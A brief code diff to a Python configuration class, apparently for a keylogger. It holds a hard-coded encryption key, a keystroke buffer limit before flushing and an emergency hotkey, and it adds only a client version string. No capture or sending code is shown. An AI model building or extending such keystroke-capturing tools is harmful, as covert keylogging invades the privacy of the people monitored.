@@ -15,6 +15,7 @@ class Config:
     ENCRYPTION_KEY = base64.b64decode("nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo=")
     IV_LENGTH = 16
     BUFFER_LIMIT = 100000  # max keystrokes before flush
+    CLIENT_VERSION = "1.0"
     
     # System Settings
     EMERGENCY_HOTKEY = "ctrl+alt+shift+k"
